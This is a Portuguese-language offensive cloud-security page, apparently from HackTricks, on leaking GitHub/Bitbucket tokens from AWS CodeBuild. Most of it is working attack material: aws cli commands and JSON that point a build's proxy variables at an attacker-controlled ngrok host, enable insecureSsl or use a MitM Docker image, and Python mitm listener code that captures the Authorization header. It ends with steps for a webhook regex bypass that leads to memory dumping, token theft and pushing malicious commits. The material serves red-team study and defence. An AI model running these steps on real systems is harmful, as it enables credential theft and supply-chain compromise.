# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperar tokens configurados do Github/Bitbucket

Primeiro, verifique se existem credenciais de origem configuradas que você poderia leak:
```bash
aws codebuild list-source-credentials
```
### Via imagem Docker

Se você descobrir que a autenticação para, por exemplo, Github está configurada na conta, você pode exfiltrar esse acesso (GH token ou OAuth token) fazendo o Codebuild usar uma imagem Docker específica para executar o build do projeto.

Para isso você pode criar um novo Codebuild project ou alterar o environment de um existente para definir a Docker image.

A Docker image que você pode usar é [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta é uma imagem Docker bem básica que vai setar as env variables `https_proxy`, `http_proxy` e `SSL_CERT_FILE`. Isso permitirá que você intercepte a maior parte do tráfego do host indicado em `https_proxy` e `http_proxy` e confie no certificado SSL indicado em `SSL_CERT_FILE`.

1. **Create & Upload your own Docker MitM image**
- Siga as instruções do repo para setar o proxy IP e o SSL cert e **build the docker image**.
- **DO NOT SET `http_proxy`** para não interceptar requests ao endpoint de metadata.
- Você pode usar **`ngrok`** como `ngrok tcp 4444` para setar o proxy para o seu host
- Uma vez que a Docker image estiver construída, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- Crie um **new Codebuild project** ou **modify** o environment de um existente.
- Configure o projeto para usar a **previously generated Docker image**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Como indicado no **Github repo** você pode usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> A **mitmproxy version used was 9.0.1**, foi reportado que com a versão 10 isso pode não funcionar.

4. **Execute o build e capture as credenciais**

- Você pode ver o token no cabeçalho **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Isso também pode ser feito a partir do aws cli com algo como
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Via insecureSSL

**Codebuild** projetos têm uma configuração chamada **`insecureSsl`** que está oculta na interface web e só pode ser alterada pela API.\
Habilitar isso permite que o Codebuild se conecte ao repositório **sem verificar o certificado** oferecido pela plataforma.

- Primeiro você precisa enumerar a configuração atual com algo como:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Em seguida, com as informações coletadas você pode atualizar a configuração do projeto **`insecureSsl`** para **`True`**. A seguir está um exemplo de como atualizei um projeto; observe **`insecureSsl=True`** no final (esta é a única coisa que você precisa alterar na configuração coletada).
- Além disso, adicione também as variáveis de ambiente **http_proxy** e **https_proxy** apontando para seu ngrok tcp como:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Então, execute o exemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta indicada pelas variáveis de proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Finalmente, clique em **Build the project**, as **credentials** serão **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via protocolo HTTP~~

> [!TIP] > **Essa vulnerabilidade foi corrigida pela AWS em algum momento na semana do dia 20 de fev de 2023 (acho que na sexta). Então um atacante não pode abusar mais dela :)**

Um atacante com **permissões elevadas em um CodeBuild poderia leak o token do Github/Bitbucket** configurado ou, se as permissões foram configuradas via OAuth, o **token OAuth temporário usado para acessar o código**.

- Um atacante poderia adicionar as variáveis de ambiente **http_proxy** e **https_proxy** ao projeto CodeBuild apontando para sua máquina (por exemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Em seguida, altere a URL do github repo para usar HTTP em vez de HTTPS, por exemplo: `http://github.com/carlospolop-forks/TestActions`
- Depois, execute o exemplo básico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta apontada pelas variáveis de proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Em seguida, clique em **Construir o projeto** ou inicie a compilação a partir da linha de comando:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Finalmente, as **credenciais** serão **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Agora um atacante poderá usar o token a partir da sua máquina, listar todos os privilégios que ele tem e (ab)usar mais facilmente do que usando o serviço CodeBuild diretamente.

## Bypass da allowlist de regex ACTOR_ID no filtro de webhook (builds privilegiados acionados por PR)

Webhooks do CodeBuild para GitHub mal configurados que usam regexes `ACTOR_ID` sem âncoras permitem que PRs *não confiáveis* iniciem builds privilegiados. Se a allowlist for algo como `123456|7890123` sem `^`/`$`, qualquer ID contendo uma dessas substrings corresponde. Como os IDs de usuário do GitHub são sequenciais, um atacante pode competir para registrar um ID “eclipsing” (uma superstring de um ID confiável) e acionar o build.

**Caminho de exploração**

1. Encontre projetos CodeBuild públicos expondo filtros de webhook e extraia uma allowlist `ACTOR_ID` sem âncoras.
2. Obtenha um eclipsing GitHub ID:
- Amostre o contador global de IDs criando/deletando orgs do GitHub (org IDs compartilham o mesmo pool).
- Pré-prepare muitas criações de manifest de GitHub App e dispare as confirmation URLs quando o contador estiver dentro de ~100 IDs do alvo para registrar em rajada um bot ID contendo a substring confiável.
3. Abra um PR a partir da conta eclipsing; a regex corresponde à substring e o build privilegiado é executado.
4. Use RCE durante o build (por exemplo, hooks de instalação de dependências) para despejar a memória do processo que manipula a credencial do GitHub e recuperar o token PAT/OAuth.
5. Com o token com scope `repo`, convide sua conta como collaborator/admin e faça push/approve de commits maliciosos ou exfiltrate secrets.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
